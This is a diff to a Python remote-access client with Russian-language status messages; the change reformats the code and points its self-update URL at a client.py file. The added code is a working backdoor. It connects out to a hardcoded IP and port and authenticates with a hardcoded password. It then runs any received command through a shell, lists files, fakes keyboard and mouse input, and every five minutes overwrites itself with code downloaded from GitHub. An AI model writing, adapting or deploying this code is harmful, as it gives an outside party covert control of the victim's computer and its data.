@@ -1,1 +1,127 @@
-import socketimport structimport threadingimport timeimport osimport sysimport requestsSERVER_IP = '176.106.246.150'SERVER_PORT = 12536PASSWORD = 'StrongPassword123'UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/refs/heads/main/server.py'CHECK_INTERVAL = 300def auto_update():    while True:        try:            print('[*] Проверка обновлений...')            r = requests.get(UPDATE_URL, timeout=10)            if r.status_code == 200:                remote_code = r.text                local_path = os.path.realpath(__file__)                with open(local_path, 'r', encoding='utf-8') as f:                    local_code = f.read()                if remote_code != local_code:                    print('[*] Найдена новая версия. Обновление...')                    backup = local_path + '.bak'                    os.replace(local_path, backup)                    with open(local_path, 'w', encoding='utf-8') as f:                        f.write(remote_code)                    print('[*] Обновление завершено. Перезапустите вручную.')                    break                else:                    print('[*] Уже последняя версия.')            else:                print(f'[!] Ошибка при проверке обновлений: HTTP {r.status_code}')        except Exception as e:            print(f'[!] Ошибка автообновления: {e}')        time.sleep(CHECK_INTERVAL)def send_data(sock, data: bytes):    sock.sendall(struct.pack('>I', len(data)))    sock.sendall(data)def recv_data(sock) -> bytes:    raw_len = sock.recv(4)    if not raw_len:        return b''    length = struct.unpack('>I', raw_len)[0]    data = b''    while len(data) < length:        packet = sock.recv(length - len(data))        if not packet:            break        data += packet    return datadef handle_connection(s):    send_data(s, b'PASSWORD:')    pwd = recv_data(s).decode()    if pwd != PASSWORD:        send_data(s, b'ACCESS DENIED')        return    send_data(s, b'ACCESS GRANTED')    while True:        cmd = recv_data(s).decode()        if not cmd:            break        parts = cmd.split()        action = parts[0].lower()        try:            if action == 'ls':                path = ' '.join(parts[1:]) or '.'                files = os.listdir(path)                send_data(s, '\n'.join(files).encode())            elif action == 'key_write':                text = cmd[len('key_write'):].strip()                import pyautogui                pyautogui.write(text)                send_data(s, b'OK')            elif action == 'key_press':                import pyautogui                pyautogui.press(parts[1])                send_data(s, b'OK')            elif action == 'mouse_move':                x, y = map(int, parts[1:3])                import pyautogui                pyautogui.moveTo(x, y)                send_data(s, b'OK')            elif action == 'mouse_click':                button = parts[1] if len(parts) > 1 else 'left'                clicks = int(parts[2]) if len(parts) > 2 else 1                import pyautogui                pyautogui.click(button=button, clicks=clicks)                send_data(s, b'OK')            else:                import subprocess                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)                send_data(s, out)        except Exception as e:            send_data(s, f'ERROR: {e}'.encode())def connect_forever():    threading.Thread(target=auto_update, daemon=True).start()    while True:        try:            print(f'[*] Подключение к {SERVER_IP}:{SERVER_PORT}...')            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:                s.connect((SERVER_IP, SERVER_PORT))                print('[+] Успешное подключение')                handle_connection(s)        except Exception as e:            print(f'[!] Ошибка подключения: {e}')        time.sleep(10)if __name__ == '__main__':    connect_forever()
+import socket
+import struct
+import threading
+import time
+import os
+import sys
+import requests
+
+SERVER_IP = '176.106.246.150'
+SERVER_PORT = 12536
+PASSWORD = 'StrongPassword123'
+
+UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/refs/heads/main/client.py'
+CHECK_INTERVAL = 300
+
+def auto_update():
+    while True:
+        try:
+            print('[*] Проверка обновлений...')
+            r = requests.get(UPDATE_URL, timeout=10)
+            if r.status_code == 200:
+                remote_code = r.text
+                local_path = os.path.realpath(__file__)
+                with open(local_path, 'r', encoding='utf-8') as f:
+                    local_code = f.read()
+                if remote_code != local_code:
+                    print('[*] Найдена новая версия. Обновление...')
+                    backup = local_path + '.bak'
+                    os.replace(local_path, backup)
+                    with open(local_path, 'w', encoding='utf-8') as f:
+                        f.write(remote_code)
+                    print('[*] Обновление завершено. Перезапустите вручную.')
+                    break
+                else:
+                    print('[*] Уже последняя версия.')
+            else:
+                print(f'[!] Ошибка при проверке обновлений: HTTP {r.status_code}')
+        except Exception as e:
+            print(f'[!] Ошибка автообновления: {e}')
+        time.sleep(CHECK_INTERVAL)
+
+def send_data(sock, data: bytes):
+    sock.sendall(struct.pack('>I', len(data)))
+    sock.sendall(data)
+
+def recv_data(sock) -> bytes:
+    raw_len = sock.recv(4)
+    if not raw_len:
+        return b''
+    length = struct.unpack('>I', raw_len)[0]
+    data = b''
+    while len(data) < length:
+        packet = sock.recv(length - len(data))
+        if not packet:
+            break
+        data += packet
+    return data
+
+def handle_connection(s):
+    send_data(s, b'PASSWORD:')
+    pwd = recv_data(s).decode()
+    if pwd != PASSWORD:
+        send_data(s, b'ACCESS DENIED')
+        return
+    send_data(s, b'ACCESS GRANTED')
+
+    while True:
+        cmd = recv_data(s).decode()
+        if not cmd:
+            break
+
+        parts = cmd.split()
+        action = parts[0].lower()
+
+        try:
+            if action == 'ls':
+                path = ' '.join(parts[1:]) or '.'
+                files = os.listdir(path)
+                send_data(s, '\n'.join(files).encode())
+
+            elif action == 'key_write':
+                text = cmd[len('key_write'):].strip()
+                import pyautogui
+                pyautogui.write(text)
+                send_data(s, b'OK')
+
+            elif action == 'key_press':
+                import pyautogui
+                pyautogui.press(parts[1])
+                send_data(s, b'OK')
+
+            elif action == 'mouse_move':
+                x, y = map(int, parts[1:3])
+                import pyautogui
+                pyautogui.moveTo(x, y)
+                send_data(s, b'OK')
+
+            elif action == 'mouse_click':
+                button = parts[1] if len(parts) > 1 else 'left'
+                clicks = int(parts[2]) if len(parts) > 2 else 1
+                import pyautogui
+                pyautogui.click(button=button, clicks=clicks)
+                send_data(s, b'OK')
+
+            else:
+                import subprocess
+                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                send_data(s, out)
+
+        except Exception as e:
+            send_data(s, f'ERROR: {e}'.encode())
+
+def connect_forever():
+    threading.Thread(target=auto_update, daemon=True).start()
+    while True:
+        try:
+            print(f'[*] Подключение к {SERVER_IP}:{SERVER_PORT}...')
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((SERVER_IP, SERVER_PORT))
+                print('[+] Успешное подключение')
+                handle_connection(s)
+        except Exception as e:
+            print(f'[!] Ошибка подключения: {e}')
+        time.sleep(10)
+
+if __name__ == '__main__':
+    connect_forever()
